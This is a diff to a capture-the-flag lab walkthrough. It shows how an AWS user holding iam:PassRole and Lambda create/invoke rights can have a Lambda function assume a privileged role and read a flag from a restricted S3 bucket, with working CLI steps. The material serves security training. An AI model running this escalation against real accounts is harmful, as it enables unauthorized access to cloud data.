@@ -14,7 +14,7 @@ You start as the IAM user `pl-prod-lambda-001-to-bucket-starting-user`. This use
 - `lambda:CreateFunction` on all resources
 - `lambda:InvokeFunction` on all resources
 
-Your goal is to read `flag.txt` from `pl-prod-lambda-001-to-bucket-{account_id}-{suffix}`. You cannot access that bucket directly — your starting user has no S3 permissions at all. But the target role (`pl-prod-lambda-001-to-bucket-target-role`) does have `s3:GetObject` and `s3:ListBucket` on it, and you can pass that role to Lambda.
+Your goal is to retrieve `flag.txt` from the target S3 bucket, `pl-prod-lambda-001-to-bucket-{account_id}-{suffix}`. The hosted platform gives the bucket a per-deployment name: open the **Outputs** tab next to your terminal and copy the `target_bucket_name` output. You will use it as `TARGET_BUCKET` in the steps below. You cannot access that bucket directly — your starting user has no S3 permissions at all. But the target role (`pl-prod-lambda-001-to-bucket-target-role`) does have `s3:GetObject` and `s3:ListBucket` on it, and you can pass that role to Lambda.
 
 ## Reconnaissance
 
@@ -36,17 +36,19 @@ aws iam list-roles \
   --output table
 ```
 
-You should see `pl-prod-lambda-001-to-bucket-target-role`. Inspect its policies to understand what S3 access it holds:
+You should see `pl-prod-lambda-001-to-bucket-target-role`. `iam:ListRoles` is the only IAM read verb your user holds, so the role-policy inspection calls are not yours to run — both deny, and that is the lab's containment, not a broken step:
 
 ```bash
 aws iam list-attached-role-policies \
   --role-name pl-prod-lambda-001-to-bucket-target-role
+# An error occurred (AccessDenied) -- iam:ListAttachedRolePolicies is not granted
 
 aws iam list-role-policies \
   --role-name pl-prod-lambda-001-to-bucket-target-role
+# An error occurred (AccessDenied) -- iam:ListRolePolicies is not granted
 ```
 
-The attached or inline policy grants `s3:GetObject` and `s3:ListBucket` on `pl-prod-lambda-001-to-bucket-*`. That is your target bucket prefix. Now you know what role to pass and why.
+You cannot read the role's policies from here. The scenario's known design is that the target role holds `s3:GetObject` and `s3:ListBucket` on `pl-prod-lambda-001-to-bucket-*`. That is your target bucket prefix, and the exact bucket name comes from the `target_bucket_name` output on the Outputs tab. Now you know what role to pass and why.
 
 ## Exploitation
 
@@ -56,10 +58,10 @@ The attack is a three-step sequence: write a handler, create the function, invok
 
 Create a Python handler that uses the execution role's credentials (automatically injected into the Lambda runtime by AWS) to read `flag.txt` from the target bucket:
 
+Your starting user has no S3 permissions — the `aws s3 ls` denial in Reconnaissance is the whole story — so the bucket name comes from the platform, not the API. Take `TARGET_BUCKET` from the **Outputs** tab (`target_bucket_name`):
+
 ```bash
-TARGET_BUCKET=$(aws s3api list-buckets \
-  --query "Buckets[?starts_with(Name, 'pl-prod-lambda-001-to-bucket-')].Name" \
-  --output text)
+TARGET_BUCKET=<paste the target_bucket_name output here>
 
 cat > /tmp/lambda_function.py << EOF
 import json, boto3, os
@@ -75,7 +77,7 @@ EOF
 cd /tmp && zip -q lambda_function.zip lambda_function.py
 ```
 
-The handler does not need to manage credentials explicitly. The Lambda execution environment receives temporary credentials for whatever role is attached as the execution role. When this function runs as `pl-prod-lambda-001-to-bucket-target-role`, `boto3.client('s3')` will automatically use those credentials.
+The heredoc's `EOF` is deliberately unquoted, so the shell bakes your `TARGET_BUCKET` value into the handler file before it is zipped. The handler then does not need to manage credentials explicitly. The Lambda execution environment receives temporary credentials for whatever role is attached as the execution role. When this function runs as `pl-prod-lambda-001-to-bucket-target-role`, `boto3.client('s3')` will automatically use those credentials.
 
 ### Step 2: Create the Lambda function with the bucket-access execution role
 
@@ -145,13 +147,14 @@ The flag is the contents of `flag.txt` in the target S3 bucket. In this scenario
 cat /tmp/response.json | jq -r '.body' | jq -r '.flag'
 ```
 
-Alternatively, if you want to retrieve the flag in the standard to-bucket form, extract the execution role credentials from the Lambda environment (as in the to-admin variant) and use them to run:
+The flag already arrived in the invoke response above — the `jq` extraction is the retrieval step, and nothing further is required. For reference, the canonical to-bucket form reads the object straight from the bucket with the target role's `s3:GetObject` — the permission your Lambda just exercised on your behalf:
 
 ```bash
-aws s3 cp s3://pl-prod-lambda-001-to-bucket-{account_id}-{suffix}/flag.txt -
+aws s3 cp s3://${TARGET_BUCKET}/flag.txt -
+# An error occurred (AccessDenied) -- as the starting user; only the execution role holds s3:GetObject
 ```
 
-The bucket-access role's `s3:GetObject` permission grants access to the flag object. The Lambda function you created is the mechanism that makes those permissions reachable from your unprivileged starting user.
+That denial is expected: your credentials never touched S3 directly. The Lambda function you created is the mechanism that makes the bucket-access role's `s3:GetObject` reachable from your unprivileged starting user.
 
 ## What Happened
 
